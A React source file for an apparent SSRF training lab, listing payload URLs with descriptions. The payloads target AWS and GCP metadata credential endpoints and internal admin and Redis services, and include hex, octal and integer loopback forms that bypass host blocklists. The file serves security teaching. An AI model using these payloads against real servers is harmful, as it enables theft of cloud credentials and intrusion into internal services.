import { GenericLab } from "./lab-generic";

const SSRF_PAYLOADS = [
  { id: 401, label: "AWS metadata role listing", payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", desc: "Targets the cloud metadata service to list attached IAM roles.", bypass: false },
  { id: 402, label: "AWS metadata credentials", payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/training-role", desc: "Retrieves simulated temporary credentials from the lab metadata service.", bypass: false },
  { id: 403, label: "Internal admin panel", payload: "http://127.0.0.1:8080/admin", desc: "Attempts to reach a loopback-only admin service from the server side.", bypass: false },
  { id: 404, label: "Internal Redis probe", payload: "http://127.0.0.1:6379/", desc: "Probes an internal TCP service through the HTTP fetcher.", bypass: false },
  { id: 405, label: "Hex loopback bypass", payload: "http://0x7f000001:8080/admin", desc: "Uses numeric host canonicalization to bypass a naive host blocklist.", bypass: true },
  { id: 406, label: "Octal loopback bypass", payload: "http://0177.0.0.1:8080/admin", desc: "Uses octal localhost notation to demonstrate URL parser mismatch.", bypass: true },
  { id: 407, label: "Integer loopback bypass", payload: "http://2130706433:8080/admin", desc: "Uses integer notation for 127.0.0.1 to reach the internal admin service.", bypass: true },
  { id: 408, label: "GCP metadata token", payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", desc: "Simulates targeting a cloud-provider metadata token endpoint.", bypass: false },
];

export default function LabSsrf() {
  return (
    <GenericLab
      title="Server-Side Request Forgery"
      code="SSRF"
      targetUrl="/api/lab/ssrf/fetch"
      queryParam="url"
      payloads={SSRF_PAYLOADS}
      hint="Abuse server-side URL fetching. Compare blocked direct loopback hosts with canonicalization bypasses."
    />
  );
}
